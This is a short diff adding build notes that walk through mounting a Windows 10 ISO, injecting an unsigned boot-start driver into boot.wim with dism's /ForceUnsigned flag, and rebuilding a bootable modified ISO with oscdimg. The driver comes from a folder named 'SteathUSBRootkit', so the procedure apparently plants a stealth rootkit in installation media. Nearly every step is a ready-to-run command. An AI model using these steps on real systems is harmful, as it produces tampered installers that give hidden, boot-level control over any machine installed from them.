@@ -1,0 +1,9 @@
+# Note: make sure ADK is installed and there is access to oscdimg from powershell/cmd, path of oscdimg will be at 
+C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\x86\Oscdimg
+
+1) manually mount the ISO file, originally content is laid over H:\mount-point\iso for now
+2) mount wim file using command "dism /Mount-Wim /WimFile:H:\mount-point\iso\sources\boot.wim /Index:1 /MountDir:H:\wim-mount"
+3) make sure inf file changes were done on the matching installation file that is specified for the next step for a boot-start driver
+4) add my driver using command "dism /Image:H:\wim-mount /Add-Driver /Driver:H:\SteathUSBRootkit\BootStart\x64\Release\BootStart.inf /ForceUnsigned"
+5) commit changes and unmount using command "dism /Unmount-Wim /MountDir:H:\wim-mount /Commit"
+6) rebuild ISO file using command "oscdimg -bH:\mount-point\iso\boot\etfsboot.com -u2 -h -m -lWIN10MOD H:\mount-point\iso H:\mount-point\ModifiedISO.iso"
